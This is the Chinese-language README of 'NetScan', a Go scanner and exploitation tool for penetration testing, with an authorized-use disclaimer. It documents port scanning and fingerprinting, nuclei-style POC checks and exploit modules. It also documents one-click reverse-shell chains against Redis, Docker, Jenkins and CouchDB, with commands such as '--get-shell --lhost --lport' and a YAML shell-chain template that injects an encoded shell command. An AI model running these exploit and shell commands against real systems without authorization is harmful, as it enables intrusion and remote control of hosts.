# NetScan

一款用 Go 编写的全能网络扫描器，提供 **命令行（CLI）** 与 **图形界面（GUI）** 两种形态，集主机发现、端口扫描、服务识别、OS 识别、漏洞检测、漏洞利用、一键拿 shell、Web 侦察、插件/模块/字典/POC 平台化扩展于一体。

> **v5.0.4 更新**：英文文档（[README.en.md](README.en.md) / [RELEASE_NOTES.en.md](RELEASE_NOTES.en.md) / [THIRD_PARTY_NOTICES.en.md](THIRD_PARTY_NOTICES.en.md)）；GUI 新增语言选择与内置 POC 批量检测（选数量一键运行，完成后输出）；此前版本已包含安全审计修复、指纹合规（wappalyzergo/nerva）、POC 引擎 v3、ffuf 融合、内置字典与 13 条实测利用链。

---

## 目录

- [功能概览](#功能概览)
- [快速开始](#快速开始)
- [命令行用法](#命令行用法)
- [漏洞检测与利用](#漏洞检测与利用)
- [一键拿 shell](#一键拿-shell)
- [平台化扩展](#平台化扩展)
- [图形界面用法](#图形界面用法)
- [编译与安装](#编译与安装)

---

## 功能概览

### 1. 主机发现与端口扫描

| 功能 | 说明 |
|------|------|
| TCP Connect | `-sT`（跨平台） |
| TCP SYN 半开 | `-sS`（Linux+root） |
| UDP 扫描 | `-sU` |
| FIN/NULL/Xmas/ACK | `-sF/-sN/-sX/-sA`（Linux+root） |
| 主机发现 | ARP/ICMP/TCP（`-Pn` 跳过、`-sn` 仅发现） |
| 定时模板 | `-T 0~5` |
| 速率限制 / 随机端口 | `--rate` / `--randomize` |
| 排除端口 | `--exclude-ports` |
| 代理 | `--proxy socks5://` / `http://` |
| 端口表达式 | `80 / 1-1000 / top-1000 / 22,80-90` |

### 2. 指纹与识别

| 功能 | 说明 |
|------|------|
| 端口→服务映射 | IANA 服务名注册表 + 通用端口约定（不依赖 nmap 数据） |
| 服务/版本识别 | `-sV`（40+ 自研正则探针 + **nerva Apache-2.0 兜底**，170+ 协议） |
| **OS 精确识别** | `-O`：SMB2/NTLM build 号 + 主机名 + 客户端/服务器判定 + SSH banner 发行版映射 |
| CMS/Web 指纹 | `--fp`（自研 17 种 CMS 规则 + **wappalyzergo MIT** 技术栈识别） |
| Banner 抓取 | `--banner` |
| 反向 DNS | `--dns` |

### 3. 漏洞检测与利用

| 功能 | 说明 |
|------|------|
| 未授权访问 POC | `--poc`（13 种：Redis/MongoDB/Docker/ES/Nacos...） |
| Web POC 批量扫描 | `--poc-scan`（5,380 条真实 nuclei 模板：官方 + AllForOne MIT 子集，支持多请求/raw） |
| 定向 POC 验证 | `--poc-scan --poc-id <CVE/关键字>`（仅运行 id/name 匹配的模板） |
| 外带检测(OAST) | `--oast <ip:port>`（内置 HTTP 回调，支持 SSRF/RCE 外带模板；端口 0=随机） |
| 漏洞利用 | `--exploit <模块>` / `auto` |
| 利用模块列表 | `--exploit-list`（206 个） |
| 全量漏洞报告 | `--vuln-report`（名称+复现步骤） |
| 目标漏洞扫描 | `--scan-vuln`（仅命中） |
| 弱口令爆破 | `--brute`（7 种服务 + 内置字典） |

### 4. 一键拿 shell

| 服务 | 端口 | 利用链 |
|------|------|--------|
| Redis | 6379 | 未授权 → 写 cron 反弹 |
| Docker | 2375/2376 | 未授权 → 特权容器逃逸 |
| Jenkins | 8080/8090 | 未授权脚本控制台 RCE |
| CouchDB | 5984 | query_servers 命令注入 |
| ThinkPHP/PHPUnit/Struts2/命令注入/WebShell | 80 等 | 内置 RCE 链 |
| 自定义 | 任意 | 平台化 shells/*.yaml |

### 5. Web 侦察

| 功能 | 说明 |
|------|------|
| 目录爆破 | `-dir`（180+ 路径） |
| Web 模糊测试(ffuf 全功能) | `--fuzz-url http://target/FUZZ`：多词表/多关键字、clusterbomb/pitchfork/sniper、Encoder、raw/原始请求文件、延时/限速/超时、匹配与过滤(状态码/大小/词数/行数/正则/耗时)、and/or 组合、自动校准、递归目录、HTTP2/SNI/客户端证书/重放代理、Scraper、审计/调试日志、json/ejson/html/md/csv/ecsv 导出 |
| 内置 payload 字典 | `--fuzz-w builtin:<名称>`：66 个逐文件许可审计通过的 PayloadsAllTheThings(MIT) 字典，如 `builtin:springboot_actuator`、`builtin:param_miner_lowercase_headers`；GUI「工具→字典」可查看全部 |
| 子域名爆破(ffuf) | `--fuzz-mode subdomain --fuzz-sub example.com [--fuzz-scheme https] [--fuzz-port 443]`（泛解析自动校准） |
| 虚拟主机爆破(ffuf) | `--fuzz-mode vhost --fuzz-vhost example.com --fuzz-url http://IP:PORT/`（Host 头 FUZZ 爆破） |
| 子域名爆破(DNS) | `-sub --sub-depth` |
| HTTP 安全头检查 | `-web` |
| Whois / DNS | `-whois` / `-dnsq` |

### 6. 其它工具

| 功能 | 说明 |
|------|------|
| 反弹 shell 生成 | `-shell`（10 种） |
| 路由跟踪 / Ping | `-tr` / `-sp` |
| 定时监控 | `--monitor --interval` |

### 7. 输出与存储

| 功能 | 说明 |
|------|------|
| JSON/XML/grepable/CSV/HTML | `-oJ/-oX/-oG/-oC/-oH` |
| SQLite 资产库 | `--store / --history / --diff` |

---

## 快速开始

```bash
netscan -version        # 查看版本
netscan -h              # 查看全部参数
netscan -target 192.168.1.1 -p 1-1000 -sV          # 端口 + 服务识别
netscan -target 192.168.1.1 -p 8080 --poc           # 内置 POC 全量检测
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773   # 定向 POC
netscan -target 192.168.1.1 -p 8080 --exploit CVE-2021-41773  # 真实利用链
```

GUI 版本双击 `netscan-gui-windows-x64.exe` 启动。

---

## 命令行用法

### 输入格式

| 参数 | 支持写法 | 示例 |
|---|---|---|
| `-target` | IP / 域名 / CIDR / IPv4 范围 | `192.168.1.1`、`example.com`、`192.168.1.0/24`、`192.168.1.1-50` |
| `-p` | 单端口 / 逗号 / 范围 / 服务名 | `80`、`80,443`、`1-1000`、`http,ssh,3306` |

扫描：`-sT` TCP（默认）、`-sU` UDP、`-Pn` 跳过发现、`-T4` 提速；
识别：`-sV` 版本、`-O` 系统、`--fp` Web 指纹、`--banner` Banner。

### 常用命令

```bash
# 扫描
netscan -target 192.168.1.0/24 -p 22,80,443 -sT -sV -O
netscan -target 192.168.1.1 -p 53,123 -sU
netscan -target example.com -p 80 --fp --banner -oH report.html

# POC / 漏洞库
netscan -target 192.168.1.1 -p 80 --poc                  # 全部 5,380 条模板
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773 --poc-debug
netscan -target 192.168.1.1 -p 80 --poc --oast 192.168.1.10:9999
netscan -target 192.168.1.1 -p 80 --scan-vuln

# 利用 / 拿 shell
netscan --exploit-list
netscan -target 192.168.1.1 -p 8080 --exploit CVE-2021-41773
netscan -target 192.168.1.1 -p 6379 --exploit redis-write-shell
netscan -target 192.168.1.1 -p 6379 --get-shell --lhost 10.0.0.1 --lport 4444

# Web 侦察 / 模糊测试
netscan -target example.com -p 80 -dir
netscan -target example.com -sub --sub-depth 2
netscan -target example.com -whois
netscan -target example.com -dnsq
netscan -h              # 帮助中包含全部 --fuzz-* 参数
```

---

## 平台化扩展

所有扩展都通过 YAML/JSON 文件热插拔，**无需改 Go 代码**：

| 子命令 | 目录 | 说明 |
|--------|------|------|
| `module list/add/remove` | `modules/` | 漏洞检测/利用模块 |
| `shell list/add/remove` | `shells/` | 一键拿 shell 链 |
| `dict list/add` | `dicts/` | 弱口令字典 |
| `pocs list/add/remove` | `pocs/` | POC 模板 |
| `plugin list/install/remove/update` | `plugins/` | 插件 |

### 插件类型(plugins/*.yaml)

| 类型 | 说明 |
|------|------|
| `poc` / `exploit` | 自定义漏洞检测/利用（复用 POC 模板引擎，`request`/`response` 字段） |
| `report` | 自定义报告（`template` 字段，Go template 渲染报告文件） |
| `output` | 自定义输出格式（`template` 字段，逐行渲染结果） |
| `notification` | 通知（`webhook` 字段，扫描完成后推送结果 JSON） |

远程插件市场：`netscan --plugin-market http://host:port ...`，从远程拉取插件列表与文件。

### 自定义漏洞模块(modules/*.yaml)

```yaml
id: custom-vuln
name: 自定义漏洞
type: exploit        # detect / exploit
severity: critical
method: GET
path: /custom-endpoint
match:
  - "root:"
```

### 自定义拿 shell 链(shells/*.yaml)

```yaml
id: my-rce
name: 我的RCE
port: 8000
detect_path: /ping
detect_match: "pong"
steps:
  - method: GET
    path: /exec?cmd={{SHELL_ENC}}   # {{LHOST}} {{LPORT}} {{SHELL}} {{SHELL_ENC}}
```

---

## 图形界面用法

双击 `netscan-gui-windows-x64.exe`，主要区域：

- **扫描**：目标/端口/技术/识别/检测配置 + 实时结果表格（含 OS 精确识别、高危标记）
- **漏洞利用**：爆破、漏洞利用(auto/指定)、反弹 shell 生成、**一键拿 shell**、**扫描目标漏洞**、**漏洞报告**
- **资产历史**：SQLite 历史查询
- **插件**：插件/POC/字典/模块/拿 shell 链管理

---

## 编译与安装

```bash
# CLI(纯 Go, 交叉编译)
go build -o netscan ./cmd/cli

# GUI(WebView, 仅本机)
go build -ldflags "-H windowsgui" -o netscan-gui ./cmd/gui
```

### 构建脚本

| 脚本 | 平台 | 产物 |
|------|------|------|
| `buildcli.ps1` / `buildcli.sh` | Windows / Linux·macOS | 交叉编译 17 平台 CLI |
| `buildgui.ps1` / `buildgui.sh` | Windows / Linux·macOS | 本机构建 GUI（单平台） |

```bash
# Windows
powershell -ExecutionPolicy Bypass -File buildcli.ps1
powershell -ExecutionPolicy Bypass -File buildgui.ps1

# Linux / macOS
./buildcli.sh
./buildgui.sh
```

### 交叉编译

CLI 已覆盖 17 平台：Windows/Linux/macOS/FreeBSD/NetBSD/OpenBSD × x64/x86/arm64（macOS 无 x86）。

### 前置条件

- Go 1.25+
- GUI 编译需 C++ 编译器 + WebView 运行时（Windows 需 WebView2）

---

## 免责声明

本工具仅供网络管理员进行授权的安全评估与网络诊断使用。请勿在未获得授权的情况下对他人网络进行扫描或利用，否则可能触犯法律。使用者须自行承担全部责任。
